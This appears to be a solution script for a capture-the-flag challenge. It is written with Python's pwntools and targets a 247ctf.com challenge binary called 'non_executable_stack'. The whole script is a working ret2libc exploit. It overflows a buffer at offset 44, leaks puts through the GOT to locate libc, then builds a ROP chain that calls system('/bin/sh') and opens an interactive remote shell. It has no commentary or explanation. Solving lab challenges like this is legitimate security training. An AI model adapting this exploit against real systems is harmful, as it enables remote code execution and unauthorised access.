from pwn import *

elf = context.binary = ELF('./non_executable_stack')
libc = ELF('libc6-i386_2.27-3ubuntu1_amd64.so')
context.log_level = 'debug'

offset = 44

p = remote('026753aefb83c764.247ctf.com', 50017)

rop = ROP(elf)
rop.raw(b'A' * offset)
rop.raw(elf.plt.puts)
rop.raw(elf.sym.main)
rop.raw(elf.got.puts)

p.sendlineafter(':', rop.chain())
p.recvuntil('!\n')

puts = u32(p.recv(4))
log.info('puts, %#x', puts)

libc.address = puts - libc.sym.puts
log.info('libc.address, %#x', libc.address)

rop = ROP(libc)
rop.raw(b'A' * offset)
rop.raw(libc.sym.system)
rop.raw(libc.sym.exit)
rop.raw(next(libc.search(b'/bin/sh\x00')))

p.sendlineafter(':', rop.chain())

p.interactive()
